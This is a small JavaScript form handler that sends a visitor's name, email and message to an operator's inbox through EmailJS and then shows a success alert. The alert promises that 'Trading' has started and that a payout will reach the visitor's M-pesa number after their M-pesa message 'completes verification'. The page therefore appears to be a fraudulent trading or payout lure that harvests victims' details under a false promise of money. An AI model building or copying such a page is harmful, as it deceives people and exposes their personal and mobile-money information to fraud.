function sendMail() {
    var params = {
      name: document.getElementById("name").value,
      email: document.getElementById("email").value,
      message: document.getElementById("message").value,
    };
     const serviceID = "service_gzcatwf";
    const templateID = "template_0p4hanq";
  
      emailjs.send(serviceID, templateID, params)
      .then(res=>{
          document.getElementById("name").value = "";
          document.getElementById("email").value = "";
          document.getElementById("message").value = "";
          console.log(res);
          alert(" Success; Your Trading have started , Your Payout will reflect in Your M-pesa Number  after a successfull Trade.  You will get paid to Your M-pesa Number  when your M-pesa Message Completes Verification ⚠ ")
  
      })
      .catch(err=>console.log(err));
  
  }